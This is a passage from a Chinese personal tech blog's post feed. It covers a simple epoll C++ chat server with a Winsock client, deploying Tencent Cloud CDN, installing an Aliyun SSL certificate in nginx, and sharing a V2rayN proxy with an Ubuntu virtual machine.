class="built_in">htonl</span>(INADDR_ANY);<span class="comment">// 绑定本地所有IP</span></span><br><span class="line">addr.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ret = <span class="built_in">bind</span>(sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="built_in">sizeof</span>(addr));</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;bind error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听客户端连接</span></span><br><span class="line">ret = <span class="built_in">listen</span>(sockfd, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;listen error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建epoll实例</span></span><br><span class="line"><span class="type">int</span> epld = <span class="built_in">epoll_create</span>(<span class="number">1</span>);<span class="comment">// 参数需要大于0</span></span><br><span class="line"><span class="keyword">if</span> (epld &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;epoll create error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将监听的socket加入epoll</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">epoll_event</span> ev;</span><br><span class="line">ev.events = EPOLLIN;<span class="comment">// 读事件</span></span><br><span class="line">ev.data.fd = sockfd;</span><br><span class="line"></span><br><span class="line">ret = <span class="built_in">epoll_ctl</span>(epld, EPOLL_CTL_ADD, sockfd, &amp;ev);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;epoll_ctl error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存客户端信息</span></span><br><span class="line">std::map&lt;<span class="type">int</span>, Client&gt; clients;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环监听客户端</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">epoll_event</span> evs[MAX_CONN];</span><br><span class="line"><span class="type">int</span> n = <span class="built_in">epoll_wait</span>(epld, evs, MAX_CONN, <span class="number">-1</span>);<span class="comment">// 阻塞，返回有操作的客户端的数量</span></span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;epoll_wait error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> fd = evs[i].data.fd;</span><br><span class="line"><span class="comment">// 监听的fd收到消息</span></span><br><span class="line"><span class="keyword">if</span> (fd == sockfd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> client_addr;</span><br><span class="line"><span class="type">socklen_t</span> client_addr_len = <span class="built_in">sizeof</span>(client_addr);</span><br><span class="line"><span class="type">int</span> client_sockfd = <span class="built_in">accept</span>(sockfd, (<span class="keyword">struct</span> sockaddr *) &amp; client_addr, &amp;client_addr_len);</span><br><span class="line"><span class="keyword">if</span> (client_sockfd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;accept error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将客户端socket加入epoll</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">epoll_event</span> ev_client;</span><br><span class="line">ev_client.events = EPOLLIN;<span class="comment">// 读事件, 检测客户端消息</span></span><br><span class="line">ev_client.data.fd = client_sockfd;</span><br><span class="line">ret = <span class="built_in">epoll_ctl</span>(epld, EPOLL_CTL_ADD, client_sockfd, &amp;ev_client);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">perror</span>(<span class="string">&quot;client_epoll_ctl error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; client_addr.sin_addr.s_addr &lt;&lt; <span class="string">&quot;has entered~&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存该客户端的信息</span></span><br><span class="line">Client client;</span><br><span class="line">client.sockfd = client_sockfd;</span><br><span class="line">client.name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">clients[client_sockfd] = client;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>  <span class="comment">// 监听到客户端消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line"><span class="type">int</span> n = <span class="built_in">read</span>(fd, buffer, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;消息接收错误!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == n)<span class="comment">// 客户端断开连接</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 清除客户端信息</span></span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line"><span class="built_in">epoll_ctl</span>(epld, EPOLL_CTL_DEL, fd, <span class="number">0</span>);</span><br><span class="line">clients.<span class="built_in">erase</span>(fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// char数组转化为string</span></span><br><span class="line">std::string <span class="built_in">msg</span>(buffer, n);</span><br><span class="line"><span class="comment">// 若客户端name为空，则消息是该客户端的用户名</span></span><br><span class="line"><span class="keyword">if</span> (clients[fd].name == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">clients[fd].name = msg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 否则是聊天消息</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">std::string name = clients[fd].name;</span><br><span class="line"><span class="comment">// 将消息发送给其他所有客户端</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> &amp;c : clients)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c.first != fd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">write</span>(c.first, (<span class="string">&#x27;[&#x27;</span> + name + <span class="string">&#x27;]&#x27;</span> + <span class="string">&quot;: &quot;</span> + msg).<span class="built_in">c_str</span>(), msg.<span class="built_in">size</span>() + name.<span class="built_in">size</span>() + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭epoll实例</span></span><br><span class="line"><span class="built_in">close</span>(epld);</span><br><span class="line"><span class="built_in">close</span>(sockfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;Ws2_32.lib&quot;</span>)   <span class="comment">// link with Ws2_32.lib</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 1024</span></span><br><span class="line"><span class="type">char</span> szMsg[BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">SendMsg</span><span class="params">(<span class="type">void</span> *arg)</span> <span class="comment">// 固定写法，接收任何消息</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SOCKET sock = *((SOCKET *)arg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, szMsg);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(szMsg, <span class="string">&quot;QUIT\n&quot;</span>) || !<span class="built_in">strcmp</span>(szMsg, <span class="string">&quot;quit\n&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">closesocket</span>(sock);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">send</span>(sock, szMsg, <span class="built_in">strlen</span>(szMsg), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">RecvMsg</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SOCKET sock = *((SOCKET*)arg);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> msg[BUF_SIZE];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">recv</span>(sock, msg, <span class="built_in">sizeof</span>(msg) - <span class="number">1</span>, <span class="number">0</span>);    <span class="comment">// 字符串结束有一个&#x27;\0&#x27;所以减一</span></span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">-1</span>)  <span class="comment">// 服务器崩溃</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        msg[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 初始化socket环境</span></span><br><span class="line">    WORD wVersionRequested;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* Tell the user that we could not find a usable */</span></span><br><span class="line">        <span class="comment">/* WinSock DLL.                                  */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> ||</span><br><span class="line">        <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 建立windows socket环境</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket</span></span><br><span class="line">    SOCKET hSock;</span><br><span class="line">    hSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定端口</span></span><br><span class="line">    SOCKADDR_IN servAdr;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;servAdr, <span class="number">0</span>, <span class="built_in">sizeof</span>(SOCKADDR_IN));</span><br><span class="line">    servAdr.sin_family = AF_INET;</span><br><span class="line">    servAdr.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>);</span><br><span class="line">    <span class="built_in">inet_pton</span>(AF_INET, <span class="string">&quot;47.115.204.216&quot;</span>, &amp;servAdr.sin_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接服务器</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">connect</span>(hSock, (SOCKADDR*)&amp;servAdr, <span class="built_in">sizeof</span>(servAdr)) == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connect error: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;欢迎来到聊天室，请输入您的用户名: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环发消息</span></span><br><span class="line">    HANDLE hSendHandle = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)SendMsg, (<span class="type">void</span> *)&amp;hSock, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环收消息</span></span><br><span class="line">    HANDLE hReceiveHand = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)RecvMsg, (<span class="type">void</span>*)&amp;hSock, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待两个线程结束</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hSendHandle, INFINITE);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hReceiveHand, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">closesocket</span>(hSock);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>服务器运行服务端程序，多台电脑运行客户端程序即可实现简易的收发消息</p><p>注：这里演示用的本机</p><p><img src="https://img.gejiba.com/images/e9e67e8e76b8c7fdd5629f8a7d88bfcd.png" alt="image-20231015180114762"></p><p><img src="https://img.gejiba.com/images/c4c26b10a2f3f130a8078627f77101f3.png" alt="image-20231015180031194"></p><p><img src="https://img.gejiba.com/images/1bd5c1b9bde7be8c8cfce88a3c5a9a0b.png" alt="image-20231015180045513"></p><p><img src="https://img.gejiba.com/images/61c82c96682b83fab9e3758e444a331a.png" alt="image-20231015180057934"></p>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部署腾讯云CDN</title>
      <link href="/post/3afe4483.html"/>
      <url>/post/3afe4483.html</url>
      
        <content type="html"><![CDATA[<h2 id="申请"><a href="#申请" class="headerlink" title="申请"></a>申请</h2><p><strong>进入<a href="https://console.cloud.tencent.com/cdn">腾讯云CDN</a></strong></p><p><strong>新用户进入会提示开通，完成后就能自动获取腾讯云赠送的流量包(没有的话就去找别的学生活动领取)</strong></p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="添加域名"><a href="#添加域名" class="headerlink" title="添加域名"></a>添加域名</h3><p><strong>左侧菜单-&gt;域名管理-&gt;添加域名</strong></p><p><img src="https://z1.ax1x.com/2023/10/15/pi90fwd.png" alt="image 20231015130707188"></p><h3 id="配置选项"><a href="#配置选项" class="headerlink" title="配置选项"></a>配置选项</h3><p><strong>注意：如果回源协议选择HTTPS，配置的时候要上传SSL证书内容，否则仍然会使用HTTP访问，配置的时候忘了可以在域名管理页面删除域名重新申请</strong></p><ul><li><strong>加速区域：国内</strong></li><li><strong>加速域名：dqywy.top</strong></li><li><strong>加速类型：自选，我选择CDN网页小文件</strong></li><li><strong>IPV6：不选</strong></li><li><strong>所属项目：默认项目</strong></li><li><strong>原站类型：自有源</strong></li><li><strong>回源协议：配置了SSL就选择HTTPS，否则就选HTTP</strong></li><li><strong>源站地址：服务器公网IP，支持多个</strong></li><li><strong>推荐配置我一项没改</strong></li></ul><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a><strong>效果</strong></h2><p><img src="https://z1.ax1x.com/2023/10/15/pi90hTA.png" alt="image 20231015130229263"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云证书申请与部署</title>
      <link href="/post/15a46dc9.html"/>
      <url>/post/15a46dc9.html</url>
      
        <content type="html"><![CDATA[<h2 id="申请"><a href="#申请" class="headerlink" title="申请"></a>申请</h2><p><strong>登录<a href="https://yundun.console.aliyun.com/?spm=a2c6h.12873639.article-detail.8.2ec840788BDbhu&amp;userCode=r3yteowb&amp;p=cas#/overview/cn-hangzhou">阿里云数字证书管理服务控制台</a></strong></p><p><strong>左侧菜单-&gt;SSL证书-&gt;免费证书-&gt;立即购买</strong></p><p><img src="https://z1.ax1x.com/2023/10/15/pi90Hl8.png" alt="image 20231015123416781"></p><p><strong>产品：免费证书-&gt;数量20-&gt;其他服务：不需要</strong></p><p><img src="https://z1.ax1x.com/2023/10/15/pi907Sf.png" alt="image 20231015123511626"></p><p><strong>填写证书绑定域名-&gt;域名验证-&gt;联系人信息-&gt;密钥算法(默认RSA)-&gt;CSR生成方式(系统生成)</strong></p><ul><li>域名验证方式：如果域名在当前的阿里云账号下，那么可以选择自动DNS验证(没有这个选项就直接选手工验证)</li><li>联系人：如果之前没有填写过，新建联系人</li></ul><p><strong>证书下载</strong></p><p><img src="https://z1.ax1x.com/2023/10/15/pi90ofP.png" alt="image 20231015124013245"></p><p><strong>根据实际部署用的服务器选择，我选择<code>Nginx</code></strong></p><p><img src="https://z1.ax1x.com/2023/10/15/pi905FI.png" alt="image 20231015124043676"></p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="开启443端口"><a href="#开启443端口" class="headerlink" title="开启443端口"></a>开启443端口</h3><p>非常重要且容易忽略的一步，部署过云服务器肯定都会这个</p><h3 id="解压与上传"><a href="#解压与上传" class="headerlink" title="解压与上传"></a>解压与上传</h3><ul><li>解压证书文件得到<code>.pem</code>和<code>.key</code></li><li>云服务器上创建文件夹: <code>mkdir /etc/nginx/cert</code></li><li>上传证书到文件夹(如果使用阿里云可以直接使用实例控制台的文件发送功能)</li></ul><p><img src="https://z1.ax1x.com/2023/10/15/pi90IYt.png" alt="image 20231015124327965"></p><h3 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx -t  // 查看位置，一般为 /etc/nginx/nginx.conf</span><br><span class="line">vim /etc/nginx/nginx.conf //修改配置文件</span><br></pre></td></tr></table></figure><h4 id="HTTP部分"><a href="#HTTP部分" class="headerlink" title="HTTP部分"></a>HTTP部分</h4><p>新增<code>rewrite</code>用于把<code>http</code>的域名请求转成<code>https</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        listen       [::]:80;</span><br><span class="line">        server_name  dqywy.top;</span><br><span class="line">        root         /home/hexo;</span><br><span class="line"></span><br><span class="line">        rewrite ^(.*)$ https://dqywy.top;# 新增</span><br><span class="line"></span><br><span class="line">        # Load configuration files for the default server block.</span><br><span class="line">        include /etc/nginx/default.d/*.conf;</span><br><span class="line">        error_page 404 /404.html;</span><br><span class="line">        location = /404.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        error_page 500 502 503 504 /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="HTTPS部分"><a href="#HTTPS部分" class="headerlink" title="HTTPS部分"></a>HTTPS部分</h4><ul><li>取消注释</li><li>填写<code>server_name</code>(域名)、<code>root</code>(网站前台)、<code>ssl_certificate</code>(<code>.pem</code>文件)、<code>ssl_certificate_key</code>(<code>.key</code>文件)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       443 ssl http2;</span><br><span class="line">        listen       [::]:443 ssl http2;</span><br><span class="line">        server_name  dqywy.top;</span><br><span class="line">        root         /home/hexo;</span><br><span class="line"></span><br><span class="line">        ssl_certificate cert/dqywy.top.pem;</span><br><span class="line">        ssl_certificate_key cert/dqywy.top.key;</span><br><span class="line">        ssl_session_cache shared:SSL:1m;</span><br><span class="line">        ssl_session_timeout  10m;</span><br><span class="line">        ssl_ciphers HIGH:!aNULL:!MD5;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">        # Load configuration files for the default server block.</span><br><span class="line">        include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">        error_page 404 /404.html;</span><br><span class="line">            location = /40x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        error_page 500 502 503 504 /50x.html;</span><br><span class="line">            location = /50x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="配置完成后检查并重启"><a href="#配置完成后检查并重启" class="headerlink" title="配置完成后检查并重启"></a><strong>配置完成后检查并重启</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx -t // 检查nginx配置文件，返回successful即可</span><br><span class="line">nginx -s reload // 使配置生效</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：记得改一下本地<code>_config.yml</code>中的网站URL地址</p><p><strong>使用<code>https://域名</code>访问即可查看效果</strong></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 部署 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V2rayN实现Ubuntu共享主机VPN</title>
      <link href="/post/50a0a2de.html"/>
      <url>/post/50a0a2de.html</url>
      
        <content type="html"><![CDATA[<h2 id="V2rayN设置"><a href="#V2rayN设置" class="headerlink" title="V2rayN设置"></a>V2rayN设置</h2><p><img src="https://z1.ax1x.com/2023/10/10/pPz9ZRI.png" alt="image 20231010164429617"></p><ul><li><strong>记录本地socks监听端口</strong></li><li><strong>开启允许来自局域网的连接选项</strong></li></ul><p><img src="https://z1.ax1x.com/2023/10/10/pPz9nQP.png" alt="image 20231010164449499"></p><p><strong><code>cmd</code>输入<code>ipconfig</code>记录<code>VMnet8</code>IPv4地址</strong></p><p><img src="https://z1.ax1x.com/2023/10/10/pPz9VJA.png" alt="image 20231010164555641"></p><p><strong>打开<code>Ubuntu</code>网络有线设置</strong></p><p><img src="https://z1.ax1x.com/2023/10/10/pPz9ezt.png" alt="image 20231010164628548"></p><p><strong>打开网络代理</strong></p><p><img src="https://z1.ax1x.com/2023/10/10/pPz9Eid.png" alt="image 20231010164649978"></p><ul><li><strong>选择手动，Socks主机填入<code>VMnet8</code>的IPv4地址</strong></li><li><strong>端口填入V2rayN的本地socks监听端口</strong></li><li><strong>关闭网络代理窗口</strong></li></ul><p><img src="https://z1.ax1x.com/2023/10/10/pPz9usf.png" alt="image 20231010164717925"></p>]]></content>
      
      
      <categories>
          
          <category> 虚拟机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 共享VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++项目打包发布</title>
      <link href="/post/c4c57e4b.html"/>
      <url>/post/c4c57e4b.html</url>
      
